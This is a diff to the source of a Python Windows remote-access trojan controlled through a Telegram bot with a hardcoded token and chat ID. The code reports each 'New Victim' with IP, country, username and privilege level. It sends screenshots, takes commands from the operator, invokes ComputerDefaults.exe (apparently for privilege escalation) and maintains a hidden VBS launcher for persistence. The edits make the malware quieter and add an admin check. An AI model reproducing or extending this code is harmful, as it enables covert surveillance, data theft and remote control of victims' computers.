@@ -16,6 +16,7 @@ import threading
 import re
 class Loader():
 	def __init__(self):
+		self.progrm = sys.argv[1]
 		self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
 		self.chat_id = "1742761281"
 		data = json.loads(self.Request("http://ip-api.com/json/"))
@@ -23,13 +24,12 @@ class Loader():
 		self.country = data["country"]
 		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
 		thread = threading.Thread(target = self.Auto_Close)
-		#thread.start()
+		thread.start()
 		self.SendNotification()
 		while True:
 			try:
 				self.Main()
 			except Exception as ex:
-				print(str(ex))
 				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + str(ex))
 	def Request(self,url):
 		return requests.get(url).text.encode("utf-8")
@@ -37,13 +37,12 @@ class Loader():
 		url = "https://api.telegram.org/bot" + self.token + "/sendPhoto?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
 		requests.get(url, files={'photo':open(filename,'rb')})
 	def SendNotification(self):
-		progrm = sys.argv[1]
 		filename = "C:\\Users\\Public\\old.txt"
 		if os.path.exists(filename):
-			self.SendMessage("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
+			self.SendMessage("%F0%9F%98%88  Online Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
 		else:
 			file = open("C:\\Users\\Public\\old.txt","w")
-			self.SendMessage("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
+			self.SendMessage("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
 	def SendMessage(self,message):
 		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
 	def Main(self):
@@ -128,23 +127,27 @@ class Loader():
 						os.system("ComputerDefaults.exe")
 						exit();
 					elif command == "/change_prog" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
-						spl = message['text'].split(" ")
-						spl.remove(spl[0])
-						spl.pop()
-						prog = " ".join(spl)
-						dirname = os.path.abspath(__file__).split("\\")
-						dirname.pop()
-						filename =  "\\".join(dirname) + "\\Main.vbs"
-						file = open(filename,"r")
-						read = file.read()
-						file.close()
-						read = read.replace(re.findall('" ""(.*?)""',read)[0],prog)
-						os.system('attrib -h -s ' + filename)
-						file = open(filename,"w")
-						file.write(read)
-						file.close()
-						os.system('attrib +h +s ' + filename)
-						self.SendMessage("%E2%9C%94%EF%B8%8F Program Name Changed")
+						if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+							spl = message['text'].split(" ")
+							spl.remove(spl[0])
+							spl.pop()
+							prog = " ".join(spl)
+							dirname = os.path.abspath(__file__).split("\\")
+							dirname.pop()
+							filename =  "\\".join(dirname) + "\\Main.vbs"
+							file = open(filename,"r")
+							read = file.read()
+							file.close()
+							read = read.replace(re.findall('" ""(.*?)""',read)[0],prog)
+							os.system('attrib -h -s ' + filename)
+							file = open(filename,"w")
+							file.write(read)
+							file.close()
+							os.system('attrib +h +s ' + filename)
+							self.progrm = prog
+							self.SendMessage("%E2%9C%94%EF%B8%8F Program Name Changed")
+						else:
+							self.SendMessage("%E2%9C%96%EF%B8%8F Need Administrator Privileges")
 				else:
 					file_id = message['document']['file_id']
 					caption = message['caption']
